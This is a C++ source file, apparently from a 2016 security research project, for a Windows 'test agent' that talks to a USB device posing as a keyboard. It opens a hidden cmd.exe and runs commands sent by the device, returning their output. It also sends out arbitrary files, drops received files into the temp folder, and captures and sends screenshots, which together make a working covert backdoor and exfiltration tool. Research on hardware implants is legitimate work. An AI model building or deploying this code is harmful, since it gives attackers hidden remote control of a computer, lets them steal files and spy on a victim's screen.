/*
               Test Agent Program for the CD-ROM image       
                    Copyright (C) 2016 Seunghun Han 
         at National Security Research Institute of South Korea
*/

/*
Copyright (c) 2016 Seunghun Han at NSR of South Kora

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/


// TestAgent.cpp : Defines the entry point for the application.
//
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <gdiplus.h>
#include "hidapi.h"

#pragma comment(lib, "Gdiplus.lib")

///////////////////////////////////////////////////////////////////////////////
//
// Define Macro
//
///////////////////////////////////////////////////////////////////////////////
#define COMMAND_TYPE_COMMAND	'C'
#define COMMAND_TYPE_FILE		'F'
#define RESULT_TYPE_COMMAND		'C'
#define RESULT_TYPE_FILE		'F'

#define SEND_CHUNK_SIZE			64
#define RECV_CHUNK_SIZE			64

#define BUFSIZE					RECV_CHUNK_SIZE 
#define SLEEP_TIME_MS			10

HANDLE g_hChildStd_IN_Rd = NULL;
HANDLE g_hChildStd_IN_Wr = NULL;
HANDLE g_hChildStd_OUT_Rd = NULL;
HANDLE g_hChildStd_OUT_Wr = NULL;

HANDLE g_hInputFile = NULL;
bool g_bErrorOccur = false;

// Cherry Compact, Matias Tactile, Matias Laptop, Microsoft
DWORD g_vdwVID[] = {0x046A, 0x04D9, 0x04D9, 0x045E};
DWORD g_vdwPID[] = {0x0011, 0x4250, 0x4250, 0xFFF8};


#ifdef _DEBUG
#define	TRACE	Trace

#else
#define TRACE	Trace
#endif

void Trace(LPCTSTR pszStr, ...)   
{   
    TCHAR szMsg[256];   
    va_list args;   
    va_start(args, pszStr);   
    vsprintf(szMsg, pszStr, args);   
    OutputDebugString(szMsg);   
}

///////////////////////////////////////////////////////////////////////////////
//
// Device APIs
//
///////////////////////////////////////////////////////////////////////////////
/**
 *	Find device and open handle
 */
hid_device* OpenDevice()
{
	unsigned char buf[256];
	#define MAX_STR 255
	wchar_t wstr[MAX_STR];
	hid_device *handle;
	int i;

	struct hid_device_info *devs, *cur_dev;
	
	if (hid_init())
		return NULL;

	devs = hid_enumerate(0x0, 0x0);
	cur_dev = devs;	
	while (cur_dev) 
	{
		cur_dev = cur_dev->next;
	}
	hid_free_enumeration(devs);

	// Set up the command buffer.
	memset(buf,0x00,sizeof(buf));
	buf[0] = 0x01;
	buf[1] = 0x81;

	// Open the device using the VID, PID,
	// and optionally the Serial number.
	for (i = 0 ; i < sizeof(g_vdwPID) / sizeof(DWORD) ; i++)
	{
		handle = hid_open(g_vdwVID[i], g_vdwPID[i], NULL);
		if (!handle) {
			printf("unable to open device\n");
			continue;
		}
		else
		{
			break;
		}
	}

	return handle;
}

/**
 *	Reopen device until success
 */
hid_device* ReopenDevice(hid_device* pPrevHandle)
{
	hid_device* pNewHandle;

	if (pPrevHandle != NULL)
	{
		hid_close(pPrevHandle);
	}

	// Open device until success
	while(1)
	{
		pNewHandle = OpenDevice();
		if (pNewHandle == NULL)
		{
			Sleep(2000);
			continue;
		}

		break;
	}

	return pNewHandle;
}

/**
 *	Send data from host to firmware
 */
bool SendData(hid_device* pHandle, char* pcData, int iSize)
{
	unsigned char vcSendBuffer[256];
	int i;
	int iRemainSize;
	int res;

	//=========================================================================
	// Set Feature
	// Report ID = 1, Buffer size = Report ID(1Byte) + Feature Report Size(64Byte)
	//=========================================================================
	iRemainSize = iSize;
	for (i = 0 ; i < (iSize + SEND_CHUNK_SIZE - 1) / SEND_CHUNK_SIZE ; i++)
	{
		if (iRemainSize >= SEND_CHUNK_SIZE)
		{
			memcpy(vcSendBuffer + 1, pcData + i * SEND_CHUNK_SIZE, SEND_CHUNK_SIZE);
		}
		else
		{
			memset(vcSendBuffer, 0x00, sizeof(vcSendBuffer));
			memcpy(vcSendBuffer + 1, pcData + i * SEND_CHUNK_SIZE, iRemainSize);
		}
		iRemainSize -= SEND_CHUNK_SIZE;

		// You should set Report ID = 1
		vcSendBuffer[0] = 1;
		res = hid_send_feature_report(pHandle, vcSendBuffer, SEND_CHUNK_SIZE + 1);
		if (res < 0) {
			printf("Unable to send a feature report.\n");
			return false;
		}
		else
		{
			// Print out the returned buffer.
			/*
			printf("Feature Report\n   ");
			for (j = 0; j < res; j++)
				printf("%02hhx ", vcSendBuffer[j]);
			printf("\n");
			*/
		}
	}

	return true;
}

/**
 *	Receive data from firmware
 *		- Buffer size should be multiple of RECV_CHUNK_SIZE
 */
bool ReceiveData(hid_device* pHandle, char* pcData, int iSize)
{
	unsigned char vcRecvBuffer[256];
	int i;
	int res;

	//=========================================================================
	// Get Feature
	// Report ID = 1, Buffer size = Report ID(1Byte) + Feature Report Size(64Byte)
	//=========================================================================
	for (i = 0 ; i < (iSize + RECV_CHUNK_SIZE - 1) / RECV_CHUNK_SIZE ; i++)
	{
		// You should set Report ID = 1
		vcRecvBuffer[0] = 1;
		res = hid_get_feature_report(pHandle, vcRecvBuffer, RECV_CHUNK_SIZE + 1);
		if (res < 0) 
		{
			printf("Unable to get a feature report.\n");
			printf("%ls", hid_error(pHandle));
			return false;
		}
		else 
		{
			// Print out the returned buffer.
			/*
			printf("Feature Report\n   ");
			for (j = 0; j < res; j++)
				printf("%02X ", vcRecvBuffer[j]);
			printf("\n");
			*/
		}

		memcpy(pcData + i * RECV_CHUNK_SIZE, vcRecvBuffer, RECV_CHUNK_SIZE);
	}
	return true;
}

/**
 *	Write commands to console's pipe
 */
void WriteToPipe(char* pcBuffer) 
{ 
	DWORD dwWritten; 
	BOOL bSuccess = FALSE;

	bSuccess = WriteFile(g_hChildStd_IN_Wr, pcBuffer, strlen(pcBuffer), &dwWritten, NULL);
	bSuccess = WriteFile(g_hChildStd_IN_Wr, "\n", 1, &dwWritten, NULL);
} 

/**
 *	Read results from console's pipe and send results to firmware
 */
bool ReadFromPipe(hid_device* pHandle) 
{ 
	DWORD dwRead; 
	CHAR chBuf[BUFSIZE]; 
	BOOL bSuccess = FALSE;
	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

	while(1) 
	{ 
		bSuccess = ReadFile( g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL);
		if( ! bSuccess || dwRead == 0 ) break; 

		if (SendData(pHandle, chBuf, dwRead) == false)
		{
			return false;
		}
		Sleep(SLEEP_TIME_MS);
	}

	return true;
} 

/**
 *	Main function of read thread
 */
DWORD WINAPI ResultRecvThread(LPVOID lpParam) 
{ 
	hid_device* pHandle = (hid_device*) lpParam;
	while(1)
	{
		if (ReadFromPipe(pHandle) == false)
		{
			g_bErrorOccur = true;
			break;
		}
	}
	return 0;
}

/**
 *	Create Child Command Console
 */
void CreateConsole(void)
{
	TCHAR szCmdline[]=TEXT("C:\\Windows\\System32\\cmd.exe");
	PROCESS_INFORMATION piProcInfo; 
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE; 
	SECURITY_ATTRIBUTES saAttr;

	//printf("\n->Start of parent execution.\n");

	// Set the bInheritHandle flag so pipe handles are inherited. 
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL; 

	// Create a pipe for the child process's STDOUT. 
	if ( ! CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0) ) 
	{
		//printf("StdoutRd CreatePipe");
		return ;
	}

	// Ensure the read handle to the pipe for STDOUT is not inherited.
	if ( ! SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0) )
	{
		//printf("Stdout SetHandleInformation");
		return ;
	}

	// Create a pipe for the child process's STDIN. 
	if (! CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0)) 
	{
		//printf("Stdin CreatePipe"); 
		return ;
	}

	// Ensure the write handle to the pipe for STDIN is not inherited. 
	if ( ! SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0) )
	{
		//printf("Stdin SetHandleInformation");
		return ;
	}

	// Set up members of the PROCESS_INFORMATION structure. 
	ZeroMemory( &piProcInfo, sizeof(PROCESS_INFORMATION) );

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.
	ZeroMemory( &siStartInfo, sizeof(STARTUPINFO) );
	siStartInfo.cb = sizeof(STARTUPINFO); 
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	siStartInfo.wShowWindow = SW_HIDE;

	// Create the child process. 
	bSuccess = CreateProcess(NULL, 
		szCmdline,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		0,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

	// If an error occurs, exit the application. 
	if ( ! bSuccess ) 
	{
		printf("CreateProcess");
		return ;
	}
	else 
	{
		// Close handles to the child process and its primary thread.
		// Some applications might keep these handles to monitor the status
		// of the child process, for example. 
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}
}

/**
 *  Read until seperator. If iReadSize is not zero, read until iReadSize + seperator(1byte)
 */
bool ReadUntilSeparator(char* pcInputBuffer, char* pcOutputBuffer, char cSeperator)
{
	int iIndex = 0;
	char cData;
	int iLength = strlen(pcInputBuffer);
	bool bFind = false;
	int i;

	for (i = 0 ; i < iLength ; i++)
	{
		cData = pcInputBuffer[i];
		if (cData == cSeperator)
		{
			pcOutputBuffer[iIndex] = '\0';
			bFind = true;
			iIndex = i;
			break;
		}
	}
	
	// Copy data to input buffer
	if (bFind == true)
	{
		memcpy(pcOutputBuffer, pcInputBuffer, iIndex);
		pcOutputBuffer[iIndex] = '\0';
		strcpy(pcInputBuffer, pcInputBuffer + iIndex + 1);
	}

	return bFind;
}

/**
 *	Send file to firmware
 */
void SendFile(hid_device* pHandle, char* pcFilePath)
{
	FILE* fp;
	CHAR vcSendBuffer[BUFSIZE];
	int iSize;
	int iRead;
	int i;

	/**
	 *	Header data
	 *	Send file size first and send contents 
	 */
	fp = fopen(pcFilePath, "rb");
	if (fp == NULL)
	{
		sprintf(vcSendBuffer, "0");
		SendData(pHandle, vcSendBuffer, strlen(vcSendBuffer));
		return ;
	}

	fseek(fp, 0, SEEK_END);
	iSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	// Send file size
	sprintf(vcSendBuffer, "%d", iSize);
	if (SendData(pHandle, vcSendBuffer, strlen(vcSendBuffer)) == false)
	{
		return ;
	}

	Sleep(SLEEP_TIME_MS);

	// Send contents
	for (i = 0 ; i < (iSize + BUFSIZE - 1) / BUFSIZE ; i++)
	{
		iRead = fread(vcSendBuffer, 1, sizeof(vcSendBuffer), fp);
		if (SendData(pHandle, vcSendBuffer, iRead) == false)
		{
			return ;
		}
		
		//printf("%d/%d Send OK\r", i * BUFSIZE, iSize);
		Sleep(SLEEP_TIME_MS);
	}
	fclose(fp);
}

/**
 *	Receive file from firmware.
 */
void ReceiveFile(hid_device* pHandle, char* pcFilePathAndLength)
{
	FILE* fp;
	CHAR vcRecvBuffer[BUFSIZE];
	int iSize;
	int iWrite;
	int iTotalRecv;
	int iRecvSize;
	char vcFullPath[MAX_PATH];
	char vcPath[256];
	char vcLength[256];
	DWORD dwLastTick;

	TRACE("Start to file receive\n");

	ReadUntilSeparator(pcFilePathAndLength, vcPath, '?');

	/**
	 *	Header data
	 *	Send file size first and send contents 
	 */
	GetTempPath(sizeof(vcFullPath), vcFullPath);
	strcat(vcFullPath, vcPath);

	fp = fopen(vcFullPath, "wb");

	sscanf(pcFilePathAndLength, "%d", &iSize);
	TRACE("File length is %d, %s\n", iSize, pcFilePathAndLength);

	// Recv contents
	iTotalRecv = 0;
	dwLastTick = GetTickCount();
	while(true)
	{
		if (ReceiveData(pHandle, vcRecvBuffer, sizeof(vcRecvBuffer)) == false)
		{
			TRACE("File content receive error\n");
			break;
		}

		iRecvSize = (int) vcRecvBuffer[0];

		// No date are received during 1 second
		if (iRecvSize == 0)
		{
			if((GetTickCount() - dwLastTick) > 3000)
			{
				TRACE("File content receive timeout\n");
				break;
			}
			Sleep(SLEEP_TIME_MS);
		}
		else
		{
			// Update Tick
			dwLastTick = GetTickCount();

			if ((iTotalRecv + iRecvSize) >= iSize)
			{
				iRecvSize = iSize - iTotalRecv;
			}

			TRACE("File content received %d/%d\n", iTotalRecv, iSize);

			iWrite = fwrite(vcRecvBuffer + 1, 1, iRecvSize, fp);
			iTotalRecv += iRecvSize;
			if (iTotalRecv >= iSize)
			{
				TRACE("File content received complete%d/%d\n", iTotalRecv, iSize);
				break;
			}
		}		
		//printf("%d/%d Recv OK\r", iTotalRecv, iSize);
	}
	fclose(fp);
}


/**
 *	Get ClsID
 */
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	using namespace Gdiplus;
	UINT  num = 0;          // number of image encoders
	UINT  size = 0;         // size of the image encoder array in bytes

	ImageCodecInfo* pImageCodecInfo = NULL;

	GetImageEncodersSize(&num, &size);
	if(size == 0)
		return -1;  // Failure

	pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
	if(pImageCodecInfo == NULL)
		return -1;  // Failure

	GetImageEncoders(num, size, pImageCodecInfo);

	for(UINT j = 0; j < num; ++j)
	{
		if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 )
		{
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;  // Success
		}    
	}

	free(pImageCodecInfo);
	return 0;
}

/**
 *	Capture screen and send to firmware
 */
void CaptureScreen(hid_device* pHandle) 
{
	using namespace Gdiplus;
	
	CLSID clsid;
	HDC hScreenDC;
	HDC hMemoryDC;
	int x;
	int y;
	HBITMAP hBitmap;
	HBITMAP hOldBitmap;
	//CImage clImage;
	IStream* pclStream;
	HRESULT hResult;
	CHAR vcSendBuffer[BUFSIZE];
	ULARGE_INTEGER liSize;
	LARGE_INTEGER liSeekPos = {0};
	unsigned long iRead;
	int i;

	// get the device context of the screen
	hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);     
	// and a device context to put it in
	hMemoryDC = CreateCompatibleDC(hScreenDC);

	x = GetDeviceCaps(hScreenDC, HORZRES);
	y = GetDeviceCaps(hScreenDC, VERTRES);

	// maybe worth checking these are positive values
	hBitmap = CreateCompatibleBitmap(hScreenDC, x, y);

	// get a new bitmap
	hOldBitmap = (HBITMAP) SelectObject(hMemoryDC, hBitmap);

	BitBlt(hMemoryDC, 0, 0, x, y, hScreenDC, 0, 0, SRCCOPY);
	hBitmap = (HBITMAP) SelectObject(hMemoryDC, hOldBitmap);

	// clean up
	DeleteDC(hMemoryDC);
	DeleteDC(hScreenDC);

	// Store JPG format
	Bitmap bitmap(hBitmap, NULL);
	hResult = CreateStreamOnHGlobal(0, TRUE, &pclStream);
	GetEncoderClsid(L"image/jpeg", &clsid);
	bitmap.Save(pclStream, &clsid);
	
	pclStream->Seek(liSeekPos, STREAM_SEEK_CUR, &liSize);
	pclStream->Seek(liSeekPos, STREAM_SEEK_SET, 0);
	
	// Send file size
	sprintf(vcSendBuffer, "%d", liSize.QuadPart);
	if (SendData(pHandle, vcSendBuffer, strlen(vcSendBuffer)) == false)
	{
		return ;
	}
	Sleep(SLEEP_TIME_MS);

	// Send contents
	for (i = 0 ; i < (liSize.QuadPart + BUFSIZE - 1) / BUFSIZE ; i++)
	{
		pclStream->Read(vcSendBuffer, sizeof(vcSendBuffer), &iRead);
		
		if (SendData(pHandle, vcSendBuffer, iRead) == false)
		{
			return ;
		}
		
		Sleep(SLEEP_TIME_MS);
	}

	pclStream->Release();
	DeleteObject(hBitmap);
}

/**
 *	Define macro
 */
#define STATE_RECV_CMD		0
#define STATE_RECV_DATA		1

#define CMD_TYPE_UNKNOWN		0
#define CMD_TYPE_EXECUTE		'C'
#define CMD_TYPE_GETFILE		'G'
#define CMD_TYPE_CAPTURESCREEN	'S'
#define CMD_TYPE_PUTFILE		'P'

#define RECV_BUFFER_SIZE		64

/**
 *	Process commands from firmware
 */
DWORD WINAPI CommandRecvThread(LPVOID lpParam) 
{
	char vcTotalBuffer[1024 * 1024];
	char vcProcessBuffer[1024 * 1024];
	char vcTempBuffer[RECV_BUFFER_SIZE + 1];
	hid_device* pHandle = (hid_device*) lpParam;
	int iState = STATE_RECV_CMD;
	bool bResult;
	char vcCommand = CMD_TYPE_UNKNOWN;

	memset(vcTotalBuffer, 0, sizeof(vcTotalBuffer));
	TRACE("Command receive thread start\n");
	
	while(1)
	{
		if (ReceiveData(pHandle, vcTempBuffer, RECV_BUFFER_SIZE) == false)
		{
			g_bErrorOccur = true;
			return 0;
		}


		if (vcTempBuffer[0] == 0)
		{
			// Empty buffer, so wait until data received
			Sleep(500);
			continue;
		}

		// Null padding for strcat
		vcTempBuffer[vcTempBuffer[0] + 1] = '\0';
		strcat(vcTotalBuffer, vcTempBuffer + 1);

		TRACE("Get Data\n");

		while(1)
		{
			// Get data until separator
			bResult = ReadUntilSeparator(vcTotalBuffer, vcProcessBuffer, ';');
			if (bResult == false)
			{
				TRACE("No seperator\n");
				break;
			}

			switch(iState)
			{
			case STATE_RECV_CMD:
				// Not command!!
				if (strlen(vcProcessBuffer) != 1)
				{
					TRACE("Not command\n");
					continue;
				}
				
				// Check command
				vcCommand = vcProcessBuffer[0];
				if (vcProcessBuffer[0] == CMD_TYPE_EXECUTE)
				{
					iState = STATE_RECV_DATA;
				}
				else if (vcProcessBuffer[0] == CMD_TYPE_GETFILE)
				{
					iState = STATE_RECV_DATA;					
				}
				else if (vcProcessBuffer[0] == CMD_TYPE_PUTFILE)
				{
					iState = STATE_RECV_DATA;
				}
				else if (vcProcessBuffer[0] == CMD_TYPE_CAPTURESCREEN)
				{
					iState = STATE_RECV_DATA;
				}
				else
				{
					//fprintf(stderr, "Unknown\n");
				}
				break;

			case STATE_RECV_DATA:
				if (vcCommand == CMD_TYPE_EXECUTE)
				{
					TRACE("Execute> %s\n", vcProcessBuffer);
					WriteToPipe(vcProcessBuffer);
				}
				else if (vcCommand == CMD_TYPE_GETFILE)
				{
					TRACE("Get File> %s\n", vcProcessBuffer);
					SendFile(pHandle, vcProcessBuffer);
				}
				else if (vcCommand == CMD_TYPE_PUTFILE)
				{
					TRACE("Put File> %s\n", vcProcessBuffer);
					ReceiveFile(pHandle, vcProcessBuffer);
				}
				else if (vcCommand == CMD_TYPE_CAPTURESCREEN)
				{
					TRACE("Capture Screen>\n");
					CaptureScreen(pHandle);
				}
				iState = STATE_RECV_CMD;
				break;

			default:
				iState = STATE_RECV_DATA;
				//fprintf(stderr, "Unknown\n");
				break;
			}
		}

	}
}

/**
 *	Main function
 */
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	using namespace Gdiplus;

	HANDLE hCommandThread;
	HANDLE hResultThread;
	hid_device* pHandle = NULL;
	GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	
	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

	// Create cmd.exe process
	CreateConsole();

	while(1)
	{
		g_bErrorOccur = false;
		pHandle = ReopenDevice(pHandle);

		// Thread for remote commands' result
		hResultThread = CreateThread( 
			NULL,                   // default security attributes
			0,                      // use default stack size  
			ResultRecvThread,       // thread function name
			pHandle,				// argument to thread function 
			0,                      // use default creation flags 
			NULL);   // returns the thread identifier 

		// Thread for remote command
		hCommandThread = CreateThread( 
			NULL,                   // default security attributes
			8*1024*1024,            // use default stack size  
			CommandRecvThread,      // thread function name
			pHandle,				// argument to thread function 
			0,                      // use default creation flags 
			NULL);					// returns the thread identifier 

		// Just waiting
		while(1)
		{
			if (g_bErrorOccur == true)
			{
				TerminateThread(hResultThread, 0);
				TerminateThread(hCommandThread, 0);

				break;
			}

			Sleep(1000);
		}
	}

	/*
	// Test Menu
	while(1)
	{
		printf("============================\n");
		printf("  [1] Send File Data \n");
		printf("  [2] Send CMD Data \n");
		printf("  [3] Receive Data\n");
		printf("  [4] Exit\n");
		printf("============================\n");
		printf("Please Select:");
		scanf("%d", &iNumber);

		for (i = 0 ; i < sizeof(buf) ; i++)
		{
			buf[i] = '0' + (i % 10);
		}

		switch(iNumber)
		{
		case 1:
			//memcpy(buf, "F;;", 3);
			SendData(pHandle, buf, sizeof(buf));
			break;

		case 2:
			//memcpy(buf, "C;;", 3);
			SendData(pHandle, buf, sizeof(buf));
			break;

		case 3:
			ReceiveData(pHandle, buf, sizeof(buf));
			fprintf(stderr, buf);
			fprintf(stderr, "\n");

			if ((buf[0] == 'C') && (buf[1] == ';'))
			{
				printf("[*] Execute Command\n");
				//system(buf + 2);
				WriteToPipe(buf + 2);
			}
			break;

		default:
			exit(0);
			break;
		}
	}
	*/

#ifdef WIN32
	system("pause");
#endif

	GdiplusShutdown(gdiplusToken);

	return 0;
}